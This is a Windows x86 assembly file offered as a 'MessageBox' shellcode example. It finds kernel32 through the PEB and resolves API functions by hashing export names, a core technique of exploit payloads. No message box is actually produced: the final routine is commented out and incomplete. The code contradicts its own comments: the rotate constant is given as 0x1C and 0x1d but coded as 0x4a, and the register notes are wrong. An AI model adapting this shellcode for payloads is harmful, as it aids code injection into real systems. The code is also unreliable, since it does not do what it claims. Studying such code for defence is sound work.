;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; MessageBox Shellcode example NT6 compatible from win2000 to win2008            ;;
;;  by h0f / JeNNyLab                                                             ;;
;;   - h0f@jennylab.es                                                            ;;
;;   - agdedios@gmail.com                                                         ;;
;;   - http://www.jennylab.es                                                     ;;
;;  nasm.exe -f bin -o NT6_MessageBox.bin NT6_MessageBox.asm                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; DETAILS:
	; --------
	;       - Use peb to retreive kernel base address
	;       - Use Api hash to retreive functions
    ;       - EBX = kernel base | EAX = api address 
    ;       - Use 0x1C on ror edi
[BITS 32]

segment .text

global _find_kernel32
global _find_function

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ; NEED TO SHELLCODE FOUND
  ; Get kernel base + find function by HASH.
  ; Use modified "GREY-CORNER" method
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_find_kernel32:
	xor ecx, ecx			; set ecx to 0
	mov esi, [fs:ecx + 0x30]	; esi = &(PEB) ([FS:0x30])
	mov esi, [esi + 0x0C]		; esi = PEB->Ldr
	mov esi, [esi + 0x1C]		; esi = PEB->Ldr.InInitOrder
next_module:
	;mov ebp, [esi + 0x08]		; ebp = InInitOrder[X].base_address - original
	mov eax, [esi + 0x08]		; ebx = InInitOrder[X].base_address - modified to put in ebx
	mov edi, [esi + 0x20]		; ebp = InInitOrder[X].module_name (unicode)
	mov esi, [esi]                  
	cmp [edi + 0x18], cx		; aniway fix for compatibility with win2k modulename[12] == 00 ?
	jne next_module       
	ret


_find_function:
	pushad			      
	mov   ebp, [esp + 0x24]       
	mov   eax, [ebp + 0x3c]       
	mov   edx, [ebp + eax + 0x78] ; Export table relative offset
	add   edx, ebp                
	mov   ecx, [edx + 0x18]       
	mov   ebx, [edx + 0x20]       
	add   ebx, ebp                
find_function_loop:
	jecxz find_function_finished  ; Jump to the end if ecx is 0
	dec   ecx                     
	mov   esi, [ebx + ecx * 4]    
	add   esi, ebp                

	
compute_hash:
	xor   edi, edi                
	xor   eax, eax                
	cld                           
compute_hash_again:
	lodsb                         
	test  al, al                  
	jz    compute_hash_finished   ; ZF = 0 flag verify
	ror   edi, 0x4a                ; ror crypto key in this case (0x1d)
	add   edi, eax                
	jmp   compute_hash_again      
compute_hash_finished:         


find_function_compare:           
	cmp   edi, [esp + 0x28]      
	jnz   find_function_loop     
	mov   ebx, [edx + 0x24]      
	add   ebx, ebp               
	mov   cx, [ebx + 2 * ecx]    
	mov   ebx, [edx + 0x1c]      
	add   ebx, ebp               
	mov   eax, [ebx + 4 * ecx]   
	add   eax, ebp               
	mov   [esp + 0x1c], eax      
find_function_finished:
	popad     
	ret

	
;_find_api:		
;	push ebp
;	mov esp, ebp
;	mov esi, [ebp+8] 	;first argument
;	mov edx, [ebp+12]	;second argument	
;
;	push esi		;save
;	push edx		;save
;	xor eax, eax
;	push eax		;push 0 to endding push
;
;	call find_kernel32	; Find kernel32 address
;	; mov ebx, eax	
;	pop edi			
;
;	push 0x2f9dbf4a	; LoadLibraryA hash
;	push ebx		; kernel32 base address
;	call find_function	
;	mov edi, eax
;	
;	; LoadLibraryA (LPCTSTR lpLibFileName)
;	push ebx		
;	call eax	; call LoadLibraryA	

;	mov edi, ebx
;	mov esi, eax
	
;	push 0x7c882438
;	push ebx
;	call eax
	
	;ebx = offset kernel32.dll
	;eax = offset GetProcAddress	
	;edi = offset LoadLibraryA

